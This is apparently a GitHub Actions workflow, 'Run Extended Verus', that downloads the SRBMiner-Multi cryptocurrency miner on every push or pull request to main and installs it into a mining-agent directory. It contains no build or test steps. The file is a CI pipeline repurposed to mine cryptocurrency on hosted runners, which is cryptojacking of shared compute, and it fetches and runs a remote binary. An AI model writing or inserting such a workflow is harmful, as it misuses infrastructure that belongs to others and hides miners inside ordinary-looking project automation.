name: Run Extended Verus

on:
  push:
    branches:
      - main  # Trigger on push to the main branch
  pull_request:
    branches:
      - main  # Trigger on pull requests to the main branch

jobs:
  run-extended-mining:
    runs-on: ubuntu-latest  # Use Ubuntu environment

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Install and Run
        run: |
          wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.8/SRBMiner-Multi-2-5-8-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-5-8-Linux.tar.gz && cd SRBMiner-Multi-2-5-8 && agent-stop && cp SRBMiner-MULTI /opt/mmp/miners/sbrminer/ && agent-start
